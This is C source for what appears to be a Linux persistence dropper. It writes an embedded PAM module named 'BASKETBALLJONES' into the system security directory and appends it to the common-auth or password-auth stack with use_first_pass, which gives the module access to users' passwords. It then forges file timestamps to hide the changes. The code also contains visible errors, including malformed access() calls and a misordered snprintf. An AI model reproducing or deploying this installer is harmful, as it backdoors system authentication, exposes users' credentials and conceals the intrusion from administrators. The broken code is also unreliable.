#include <dirent.h>
#include <errno.h>
#include <libgen.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <utime.h>

// precompiled headers
#include <mod_precompiled.h>  // c_PamModule

// debug logging
#ifdef DEBUG
    #define DEBUG_LOG(...) printf(__VA_ARGS__)
#else
    #define DEBUG_LOG(...)
#endif

static const char* c_auth_stack_debian = "/etc/pam.d/common-auth";
static const char* c_auth_stack_rhel = "/etc/pam.d/password-auth";

// stampable values - configured via web interface or helper script
static const char c_mod_name[128] = "BASKETBALLJONES";

//
// guess reasonable mtime timestamp for a file (uses closest matching filename)
//
time_t best_mtime(const char *filepath)
{
    time_t best_time = 0;
    char *dirname = strdup(filepath);
    char *basename = NULL;

    if (NULL != dirname)
    {
        struct dirent **names = NULL;
        int num_names = 0;
        char *slash_idx = NULL;
        int base_len = 0;

        DEBUG_LOG("finding timestamp match for %s\n", filepath);

        // parse the dirname and basename
        slash_idx = strrchr(filepath, '/');
        basename = slash_idx + 1;
        base_len = strlen(basename);

        slash_idx = strrchr(dirname, '/');
        *slash_idx = '\0';
       
        num_names = scandir(dirname, &names, NULL, alphasort);
        if (-1 != num_names)
        {
            // start at -1 to allow /. (current dir) as a default
            int most_matched = -1;
            for (int idx=0; idx < num_names; idx++)
            {
                char *curr_name = names[idx]->d_name;
                int curr_len = strlen(curr_name);
                int min_len = curr_len < base_len ? curr_len : base_len;

                int curr = 0;
                for (; (curr < min_len) && (curr_name[curr] == basename[curr]); curr++);
                if (curr > most_matched)
                {
                    char fullpath[258] = {0};
                    struct stat sb = {0};

                    snprintf(fullpath, sizeof(fullpath), "%s/%s", dirname, curr_name);
                    if (0 == stat(fullpath, &sb))
                    {
                        DEBUG_LOG("    best match so far: %s\n", fullpath);
                        most_matched = curr;
                        best_time = sb.st_mtime;
                    }
                    else
                    {
                        DEBUG_LOG("stat failed on %s (errno: %d)\n", curr_name, errno);
                    }
                }
                // assume alphabetical order means best match should increase to a global max
                else if (most_matched > 0)
                {
                    break;
                }
            }
            free(names);
        }
        free(dirname);
    }

    return best_time;
}

//
// drop the pam module to disk
//
int drop_pam_mod(char* mod_path)
{
    int retval = -1;

    time_t best_timestamp = best_mtime(mod_path);
    if (0 != best_timestamp)
    {
        FILE *pam_mod = fopen(mod_path, "w");
        if (NULL != pam_mod)
        {
            struct utimbuf times = {best_timestamp, best_timestamp};
            if (sizeof(c_PamModule) == fwrite((void *)c_PamModule, sizeof(char), sizeof(c_PamModule), pam_mod))
            {
                DEBUG_LOG("Dropped pam module : %s\n", mod_path);

                if (0 == utime(mod_path, &times))
                {
                    DEBUG_LOG("Set timestamps for %s\n", mod_path);
                    retval = 0;
                }
                else
                {
                    DEBUG_LOG("Could not set timestamps for %s (errno: %d)\n", mod_path, errno);
                }
            }
            else
            {
                DEBUG_LOG("Could not write user exe to %s (errno: %d)\n", mod_path, errno);
            }
            fclose(pam_mod);
        }
        else
        {
            DEBUG_LOG("Could not open %s (errno: %d)\n", mod_path, errno);
        }
    }
    else
    {
        DEBUG_LOG("Could not create timestamp for %s (errno: %d)\n", mod_path, errno);
    }

    return retval;
}


//
// add the pam module to the appropriate auth stack
//
int config_auth_stack()
{
    int retval = -1;

    char *auth_stack = NULL;

    if (0 == access(c_auth_stack_debian), F_OK)
    {
        auth_stack = c_auth_stack_debian;
    }
    else if (0 == access(c_auth_stack_rhel), F_OK)
    {
        auth_stack = c_auth_stack_rhel;
    }
    
    if (auth_stack)
    {
        // save off timestamp for later
        time_t timestamp = best_mtime(auth_stack);

        if (FILE *pam_conf = fopen(auth_stack, "a"))
        {
            char entry[128] = {0};
            struct utimbuf times = {timestamp, timestamp};

            // TODO: determine if appending to the end ALWAYS results in a good config

            if (0 < fprintf(pam_conf, "\nauth    optional                        %s.so use_first_pass", c_mod_name))
            {
                DEBUG_LOG("Added %s.so to %s\n", c_mod_name, auth_stack);
                
                retval = 0;  // install has been successful - timestamp fix is optional

                if (0 == utime(auth_stack, &times))
                {
                    DEBUG_LOG("Set timestamps for %s", auth_stack);
                }
            }
            fclose(pam_conf);
        }
    }

    return retval;
}

int main()
{
    int retval = -1;

    char mod_path[128] = {0};
    snprintf("/lib/x86_64-linux-gnu/security/%s.so", sizeof(mod_path) - 1, c_mod_name);

    if (0 == drop_pam_mod(mod_path))
    {
        if (0 == config_auth_stack())
        {
            DEBUG_LOG("PAM mod installed!\n");
            retval = 0;
        }
        else
        {
            unlink(mod_path);
        }
    }

    return retval;
}